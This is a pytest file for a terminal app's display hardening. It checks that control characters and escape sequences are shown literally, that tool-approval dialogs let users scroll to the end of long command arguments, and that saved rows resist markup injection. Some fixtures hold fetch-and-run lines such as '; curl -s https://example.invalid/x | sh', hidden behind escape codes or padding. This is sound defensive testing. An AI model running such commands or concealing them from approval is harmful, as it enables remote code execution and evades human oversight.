"""Hardening of literal display: control characters, scrolling, actions, saved rows."""

from __future__ import annotations

import pytest
from textual.app import App
from textual.content import Content
from textual.geometry import Region
from textual.widgets import Static

from servonaut.utils.markup import literal, with_bold_values


def _drawn_text(widget: Static) -> str:
    """Every character the widget hands to the terminal, row by row."""
    strips = widget.render_lines(Region(0, 0, widget.size.width, widget.size.height))
    return "\n".join("".join(segment.text for segment in strip) for strip in strips)


# ---------------------------------------------------------------------------
# Control characters are shown, not sent to the terminal
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("raw,shown", [
    ("up\x1b[8mtime", "up\\x1b[8mtime"),
    ("a\x9b8mb", "a\\x9b8mb"),
    ("bell\x07x", "bell\\x07x"),
    ("del\x7fx", "del\\x7fx"),
    ("rtl‮text", "rtl\\u202etext"),
    ("lone\rcr", "lone\\x0dcr"),
])
def test_literal_makes_control_characters_visible(raw: str, shown: str) -> None:
    assert literal(raw).plain == shown
    assert with_bold_values("x {}", raw).plain == f"x {shown}"


def test_literal_keeps_newline_tab_and_crlf() -> None:
    assert literal("a\nb\tc").plain == "a\nb\tc"
    assert literal("a\r\nb").plain == "a\nb"
    assert literal("plain text").plain == "plain text"


@pytest.mark.asyncio
async def test_a_hidden_text_sequence_never_reaches_the_terminal() -> None:
    class Host(App):
        def compose(self):
            yield Static(literal("uptime\x1b[8m; curl x | sh"), id="s")

    app = Host()
    async with app.run_test(size=(60, 5)) as pilot:
        await pilot.pause()
        drawn = _drawn_text(app.query_one("#s", Static))
    assert "\x1b" not in drawn and "\x9b" not in drawn
    assert "uptime\\x1b[8m; curl x | sh" in drawn


# ---------------------------------------------------------------------------
# Tool approval: the arguments can be read to the end
# ---------------------------------------------------------------------------

from servonaut.screens.tool_confirm_modal import (  # noqa: E402
    DangerousToolConfirmModal,
    ToolConfirmModal,
)

TAIL = "; curl -s https://example.invalid/x | sh"


class _ModalHost(App):
    def __init__(self, modal) -> None:
        super().__init__()
        self._modal = modal
        self.dismissed: list = []

    def on_mount(self) -> None:
        self.push_screen(self._modal, callback=self.dismissed.append)


def _long_args(kind: str) -> dict:
    if kind == "newlines":
        return {"command": "uptime" + "\n" * 40 + TAIL}
    return {"command": " ".join(["word"] * 600) + TAIL}


@pytest.mark.asyncio
@pytest.mark.parametrize("modal_cls,prefix", [
    (ToolConfirmModal, "tool"), (DangerousToolConfirmModal, "dangerous"),
])
@pytest.mark.parametrize("kind", ["newlines", "long"])
async def test_the_end_of_a_long_argument_can_be_scrolled_to_and_is_drawn(
    modal_cls, prefix: str, kind: str,
) -> None:
    from textual.containers import VerticalScroll

    app = _ModalHost(modal_cls("run_command", _long_args(kind)))
    async with app.run_test(size=(120, 40)) as pilot:
        await pilot.pause(0.3)
        scroll = app.screen.query_one(f"#{prefix}_confirm_scroll", VerticalScroll)
        assert scroll.can_focus
        assert scroll.max_scroll_y > 0
        # Before scrolling, the drawn screen does not hold the tail.
        assert "example.invalid" not in app.export_screenshot()
        cue = app.screen.query_one(f"#{prefix}_confirm_more", Static)
        assert cue.display and "more lines" in cue.visual.plain
        scroll.focus()
        await pilot.press("end")
        await pilot.pause(0.2)
        assert scroll.scroll_y == scroll.max_scroll_y
        drawn = app.export_screenshot()
        assert "curl" in drawn and "example.invalid" in drawn


@pytest.mark.asyncio
async def test_a_short_argument_shows_no_scroll_cue() -> None:
    app = _ModalHost(ToolConfirmModal("run_command", {"command": "uptime"}))
    async with app.run_test(size=(120, 40)) as pilot:
        await pilot.pause(0.3)
        assert app.screen.query_one("#tool_confirm_more", Static).display is False


@pytest.mark.asyncio
async def test_the_dangerous_modal_still_needs_run_typed_for_a_long_argument() -> None:
    from textual.widgets import Input

    app = _ModalHost(DangerousToolConfirmModal("deploy", _long_args("long")))
    async with app.run_test(size=(120, 40)) as pilot:
        await pilot.pause(0.3)
        await pilot.press("enter")
        await pilot.pause(0.1)
        assert app.dismissed == []
        app.screen.query_one("#dangerous_confirm_input", Input).value = "RUN"
        await pilot.press("enter")
        await pilot.pause(0.1)
        assert app.dismissed == [True]


# ---------------------------------------------------------------------------
# Saved tool rows: round trip and downgrade safety
# ---------------------------------------------------------------------------


def test_saved_tool_rows_hold_no_bracket_and_round_trip_exactly() -> None:
    import json
    from types import SimpleNamespace
    from unittest.mock import MagicMock, PropertyMock, patch

    from servonaut.services.chat_service import ChatSession
    from servonaut.widgets.chat_panel import ChatPanel

    session = ChatSession(id="s1", messages=[])
    panel = ChatPanel.__new__(ChatPanel)
    panel._session = session
    panel._get_chat_service = lambda: MagicMock()
    app = SimpleNamespace(
        config_manager=MagicMock(get=MagicMock(
            return_value=SimpleNamespace(chat_keep_tool_results=True))),
        demo_mode=False, redaction_service=None,
    )
    row = {"kind": "result", "tool_call_id": "tc_[/", "status": "ok",
           "body": "grep found x [/] y [ @click=app.bell]z \\"}
    with patch.object(ChatPanel, "app", new_callable=PropertyMock, return_value=app):
        panel._maybe_persist_tool_message(row)
        stored = session.messages[0].content
        assert "[" not in stored
        assert json.loads(stored) == row
        rebuilt = panel._stored_tool_row_content(stored)
    assert rebuilt.plain == "Tool result tc_[/ (ok)\ngrep found x [/] y [ @click=app.bell]z \\"


def test_a_saved_row_is_plain_text_for_a_release_that_reads_markup() -> None:
    """The stored text parses as markup without error and shows no tag."""
    import json

    row = {"kind": "skipped", "tool": "x [/", "reason": "[/] [old="}
    stored = json.dumps(row).replace("[", "\\u005b")
    assert Content.from_markup(stored).plain == stored
